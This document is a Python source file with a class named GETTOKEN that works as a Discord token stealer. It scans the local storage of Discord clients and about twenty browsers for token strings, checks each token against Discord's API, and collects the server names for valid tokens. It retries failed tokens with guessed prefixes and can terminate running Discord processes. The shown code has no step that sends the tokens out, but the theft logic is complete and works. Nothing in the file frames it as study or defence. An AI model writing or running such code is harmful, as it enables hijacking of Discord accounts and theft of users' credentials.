import os
import re
import requests
import psutil
import threading
from collections import defaultdict

class GETTOKEN:
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.chrome_path = os.path.join(self.appdata, "Google", "Chrome", "User Data")
        self.edge_path = os.path.join(self.appdata, "Microsoft", "Edge", "User Data")
        self.firefox_path = os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles")
        self.opera_path = os.path.join(self.appdata, "Opera Software", "Opera Stable", "Local Storage", "leveldb")
        self.brave_path = os.path.join(self.appdata, "BraveSoftware", "Brave-Browser", "User Data")
        self.vivaldi_path = os.path.join(self.appdata, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")
        self.discord_path = os.path.join(self.roaming, "discord", "Local Storage", "leveldb")
        self.discord_client_path = os.path.join(self.roaming, "discord", "app-0.0.309", "resources", "app", "local storage", "leveldb")
        self.vault_path = os.path.join(self.roaming, "vault", "discord")
        self.credentials_path = os.path.join(self.appdata, "credentials")
        self.paths = {
            "Discord": os.path.join(self.roaming, "Discord"),
            "Discord Canary": os.path.join(self.roaming, "discordcanary"),
            "Discord PTB": os.path.join(self.roaming, "discordptb"),
            "Google Chrome": self.chrome_path,
            "Opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "Brave": os.path.join(self.appdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Yandex": os.path.join(self.appdata, "Yandex", "YandexBrowser", "User Data"),
            "Lightcord": os.path.join(self.roaming, "Lightcord"),
            "Opera GX": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(self.appdata, "Amigo", "User Data"),
            "Torch": os.path.join(self.appdata, "Torch", "User Data"),
            "Kometa": os.path.join(self.appdata, "Kometa", "User Data"),
            "Orbitum": os.path.join(self.appdata, "Orbitum", "User Data"),
            "CentBrowser": os.path.join(self.appdata, "CentBrowser", "User Data"),
            "Sputnik": os.path.join(self.appdata, "Sputnik", "Sputnik", "User Data"),
            "Chrome SxS": os.path.join(self.appdata, "Google", "Chrome SxS", "User Data"),
            "Epic Privacy Browser": os.path.join(self.appdata, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": self.edge_path,
            "Uran": os.path.join(self.appdata, "uCozMedia", "Uran", "User Data"),
            "Iridium": os.path.join(self.appdata, "Iridium", "User Data", "local Storage", "leveld"),
            "Firefox": self.firefox_path
        }
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.tokens = set()
        self.valid_tokens = set()
        self.server_names = defaultdict(set)
        self.run()

    def killdiscord(self):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'discord.exe' in proc.info['name'].lower():
                proc.terminate()

    def scanfolders(self):
        folders = []
        for browser, path in self.paths.items():
            if os.path.exists(path):
                if "User Data" in path:
                    folders.extend([os.path.join(path, folder) for folder in os.listdir(path)
                                    if os.path.isdir(os.path.join(path, folder)) and folder not in ("System Profile", "Guest Profile")])
                else:
                    folders.append(path)
        return folders

    def extracttokens(self, path):
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(leveldb_path):
            for filename in os.listdir(leveldb_path):
                full_file_path = os.path.join(leveldb_path, filename)
                if filename.endswith(".ldb") or filename.endswith(".log"):
                    try:
                        with open(full_file_path, "r", encoding="utf-8", errors="ignore") as f:
                            found_tokens = re.findall(self.regexp, f.read())
                            for token in found_tokens:
                                self.tokens.add(token)
                    except Exception:
                        return

    def validatetoken(self, token):
        url = "https://discord.com/api/v9/users/@me"
        headers = {"Authorization": token}
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                self.valid_tokens.add(token)
                server_response = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
                if server_response.status_code == 200:
                    servers = [guild["name"] for guild in server_response.json()]
                    self.server_names[token] = set(servers)
            else:
                return
        except requests.RequestException:
            return

    def trywithprefix(self, token):
        prefixes = ["", "MT", "OT", "N", "NT", "O", "M"]
        for prefix in prefixes:
            prefixed_token = prefix + token
            self.validatetoken(prefixed_token)

    def run(self):
        threads = []
        folders = self.scanfolders()
        for folder in folders:
            thread = threading.Thread(target=self.extracttokens, args=(folder,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        threads.clear()
        for token in self.tokens:
            thread = threading.Thread(target=self.validatetoken, args=(token,))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        threads.clear()
        for token in self.tokens:
            if token not in self.valid_tokens:
                thread = threading.Thread(target=self.trywithprefix, args=(token,))
                threads.append(thread)
                thread.start()
        for thread in threads:
            thread.join()

    def gettokens(self):
        return list(self.valid_tokens)